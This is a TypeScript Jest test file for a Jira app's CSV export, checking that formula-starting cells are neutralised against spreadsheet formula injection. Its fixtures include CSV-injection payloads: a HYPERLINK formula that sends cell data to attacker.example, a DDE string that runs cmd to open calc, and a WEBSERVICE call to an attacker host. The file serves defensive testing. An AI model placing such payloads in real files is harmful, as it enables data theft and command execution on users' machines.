/*
 * Copyright (c) 2026 Asymm Systems. All rights reserved.
 *
 * @author Fahim Farook
 */

/**
 * ASYMM-SEC-04 (CWE-1236): the baseline CSV export never hands a spreadsheet a cell that starts a
 * formula. Text cells that start with =, +, -, @, a tab or a carriage return get a leading single
 * quote; numbers the app writes (the estimate) stay numeric, negative values included.
 */

import { baselineCsv } from '../src/domain/baseline';
import { csvCell } from '../src/domain/csv';
import { exportBaseline, setGlobalStorageProvider, setSleepForTests } from '../src/index';
import { BaselineStore } from '../src/storage/baseline-store';
import { MemStorage } from './helpers/mem-storage';

const mockRequestJira = jest.fn();
jest.mock('@forge/api', () => ({
  __esModule: true,
  default: { asApp: () => ({ requestJira: mockRequestJira }), asUser: () => ({ requestJira: mockRequestJira }) },
  route: (strings: any, ...values: any[]) => strings.reduce((acc: string, str: string, i: number) => acc + str + (values[i] !== undefined ? values[i] : ''), '')
}));
jest.mock('@forge/kvs', () => ({ kvs: { get: jest.fn(), set: jest.fn(), delete: jest.fn() } }));

const HYPERLINK = '=HYPERLINK("https://attacker.example/exfil?d="&A2,"Click to View Plan")';
const DDE = "@SUM(1+1)*cmd|' /C calc'!A0";
const SUMMARY = '=WEBSERVICE("https://attacker.example/s")';

/**
 * Splits CSV the way a spreadsheet does: a quote is special only at the start of a cell, and a line
 * feed or a carriage return outside quotes ends the row. Lines that start with '#' are kept as rows.
 */
function parse(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let i = 0;
  while (i < csv.length) {
    let cell = '';
    if (csv[i] === '"') {
      i++;
      while (i < csv.length && !(csv[i] === '"' && csv[i + 1] !== '"')) { cell += csv[i]; i += csv[i] === '"' ? 2 : 1; }
      i++;
      while (i < csv.length && csv[i] !== ',' && csv[i] !== '\n' && csv[i] !== '\r') cell += csv[i++];
    } else {
      while (i < csv.length && csv[i] !== ',' && csv[i] !== '\n' && csv[i] !== '\r') cell += csv[i++];
    }
    row.push(cell);
    if (csv[i] === ',') { i++; continue; }
    rows.push(row);
    row = [];
    i++;
  }
  return rows;
}

/** A spreadsheet would run this cell as a formula (a plain number such as -2 is a value, not a formula). */
const formula = (cell: string) => /^[=+\-@\t\r]/.test(cell) && !/^-?\d+(\.\d+)?$/.test(cell);

const header = (name: string) => ({ name, frozenAt: '2026-11-06T00:00:00.000Z', digest: 'abc' } as any);

describe('ASYMM-SEC-04: baselineCsv neutralises formula cells', () => {
  it('issue keys that start with =, +, -, @, tab or CR get a leading quote and RFC 4180 quoting', () => {
    const csv = baselineCsv({ header: header('B'), items: [
      { id: '1', key: HYPERLINK },
      { id: '2', key: '+1+1' },
      { id: '3', key: '-2+3' },
      { id: '4', key: DDE },
      { id: '5', key: '\t=1+1' },
      { id: '6', key: '\r=1+1' }
    ] });
    expect(csv.split('\n').slice(2, 8)).toEqual([
      `1,"'=HYPERLINK(""https://attacker.example/exfil?d=""&A2,""Click to View Plan"")",,,,no`,
      "2,'+1+1,,,,no",
      "3,'-2+3,,,,no",
      `4,'${DDE},,,,no`,
      "5,'\t=1+1,,,,no",
      `6,"'\r=1+1",,,,no`
    ]);
  });

  it('issue ids given as text are neutralised; numbers the app writes stay numeric, negative ones too', () => {
    const csv = baselineCsv({ header: header('B'), items: [
      { id: '-1+2', key: 'P-1', hours: -2, start: '2026-11-02', end: '2026-11-06', done: true },
      { id: '7', key: 'P-7', hours: '-2+3' as any }
    ] });
    expect(csv.split('\n').slice(2, 4)).toEqual([
      "'-1+2,P-1,-2,2026-11-02,2026-11-06,yes",
      "7,P-7,'-2+3,,,no"
    ]);
  });

  it('a baseline name with a formula, a comma, a quote or a line break stays in one quoted cell', () => {
    for (const name of [HYPERLINK, 'Q4,=1+1', 'Q4\n=1+1', 'Q4\r@SUM(A1)', '-2+3', '\t=1+1']) {
      const rows = parse(baselineCsv({ header: header(name), items: [{ id: '1', key: 'P-1', hours: 8 }] }));
      expect(rows[0]).toEqual([`# ${name}`, ' frozen 2026-11-06T00:00:00.000Z', ' SHA-256 abc']);
      expect(rows[1]).toEqual(['issue_id', 'issue_key', 'estimate_hours', 'start', 'end', 'done']);
      expect(rows.flat().filter(formula)).toEqual([]);
    }
  });

  it('no parsed cell of a hostile baseline starts a formula, and quotes and commas round-trip', () => {
    const keys = [HYPERLINK, '+1+1', '-2+3', DDE, '\t=1+1', '\r=1+1', 'a,"b"', '=1,=2\n+3'];
    const csv = baselineCsv({ header: header(`${HYPERLINK},${DDE}`), items: keys.map((key, n) => ({ id: String(n), key, hours: -n })) });
    const rows = parse(csv);
    expect(rows.flat().filter(formula)).toEqual([]);
    const body = rows.slice(2);
    expect(body.map(r => r[1])).toEqual(keys.map(k => (/^[=+\-@\t\r]/.test(k) ? `'${k}` : k)));
    expect(body.map(r => r[2])).toEqual(keys.map((_, n) => String(-n)));
    expect(body.every(r => r.length === 6)).toBe(true);
  });

  it('csvCell writes numbers as they are and neutralises the same text', () => {
    expect([csvCell(-2), csvCell(0), csvCell(1.5), csvCell(undefined), csvCell(null)]).toEqual(['-2', '0', '1.5', '', '']);
    expect([csvCell('-2'), csvCell('=1'), csvCell('a"b'), csvCell('plain')]).toEqual(["'-2", "'=1", '"a""b"', 'plain']);
  });
});

describe('ASYMM-SEC-04: exportBaseline end to end', () => {
  let storage: MemStorage;
  beforeEach(async () => {
    storage = new MemStorage();
    setGlobalStorageProvider(storage);
    setSleepForTests(async () => undefined);
    mockRequestJira.mockReset();
    // The live read returns a hostile summary too; summaries are never written to the CSV (ADR-009).
    mockRequestJira.mockImplementation(async (r: any) => (String(r).includes('/search/jql')
      ? { status: 200, json: async () => ({ issues: String(r).includes('Epic') ? [] : [
        { id: '1', key: 'TEST-1', fields: { summary: SUMMARY, issuetype: { name: 'Task', hierarchyLevel: 0 }, status: { statusCategory: { key: 'new' } } } }
      ], isLast: true }) }
      : { status: 204, json: async () => ({}) }));
    await new BaselineStore(storage, 'TEST', 'default').save({ id: 'b1', name: HYPERLINK, frozenAt: '2026-11-06T00:00:00.000Z', frozenBy: null, items: [
      { id: '1', key: 'TEST-1', hours: 8, start: '2026-11-02', end: '2026-11-06' },
      { id: '2', key: '@SUM(1+1)', hours: 4 },
      { id: '3', key: '+1+1' }
    ] });
  });

  it('the exported CSV of a baseline with a hostile name and keys has no formula cell', async () => {
    const e: any = await exportBaseline({ projectKey: 'TEST', baselineId: 'b1' }, storage);
    expect(e.ok).toBe(true);
    const rows = parse(e.csv);
    expect(rows.flat().filter(formula)).toEqual([]);
    expect(rows[0][0]).toBe(`# ${HYPERLINK}`);
    expect(rows.slice(2).map(r => r[1])).toEqual(['TEST-1', "'@SUM(1+1)", "'+1+1"]);
    expect(rows.slice(2).map(r => r[2])).toEqual(['8', '4', '']);
    expect(e.csv).not.toContain(SUMMARY);
  });
});
